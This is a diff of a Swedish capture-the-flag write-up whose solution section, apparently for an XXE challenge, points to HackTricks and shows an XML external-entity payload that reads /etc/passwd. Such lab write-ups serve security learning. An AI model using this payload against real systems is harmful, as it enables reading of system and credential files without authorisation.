@@ -7,7 +7,7 @@
 [http://challs.crate.nu:16627](http://challs.crate.nu:16627)
 
 ## Solution
-1. Kolla hacktricks.xyz, de har ett tips på en xml-payload för att läsa `/etc/passwd`, testar denna
+1. Kolla [hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity), de har ett tips på en xml-payload för att läsa `/etc/passwd`, testar denna
 2. ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
